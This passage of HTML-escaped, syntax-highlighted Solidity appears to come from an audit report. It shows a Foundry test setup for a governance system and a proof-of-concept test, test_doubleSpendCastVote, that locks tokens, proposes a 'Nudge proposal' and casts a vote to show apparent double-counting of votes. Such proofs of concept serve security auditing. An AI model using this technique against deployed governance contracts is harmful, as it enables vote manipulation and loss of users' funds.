class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetDepositor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetVoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_doubleSpendCastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_initialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//zero % ownership of top protcols\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreate_lock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e365\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edays\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3600\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencodeWithSelector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enudge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eselector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epropose\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Nudge proposal\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evotingDelay\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() +\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan 